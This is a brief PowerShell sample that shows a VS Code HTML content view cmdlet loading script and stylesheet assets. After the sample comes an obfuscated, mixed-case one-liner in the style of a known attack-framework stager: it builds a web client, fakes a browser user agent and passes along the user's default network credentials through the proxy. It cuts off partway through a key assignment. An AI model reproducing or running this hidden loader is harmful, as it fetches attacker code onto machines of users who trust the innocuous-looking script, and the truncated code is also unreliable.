$params = @{
    HtmlBodyContent = "Testing JavaScript and CSS paths..."
    JavaScriptPaths = ".\Assets\script.js"
    StyleSheetPaths = ".\Assets\style.css"
}

$view = New-VSCodeHtmlContentView -Title "Test View" -ShowInColumn Two
Set-VSCodeHtmlContentView -View $view @params
[SYSTem.NeT.SErvICePoINTMAnAgeR]::ExpEcT100ContinUE = 0;$wc=NEw-OBjECT System.NeT.WebClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadeRS.AdD('User-Agent',$u);$wC.ProXy = [SYstem.Net.WeBREQUest]::DEfAUltWeBPrOxY;$wc.PrOxy.CredENTiaLS = [SySTEM.Net.CREdeNtiAlCaChe]::DefaULtNetWOrkCREDENTIAlS;$K='[

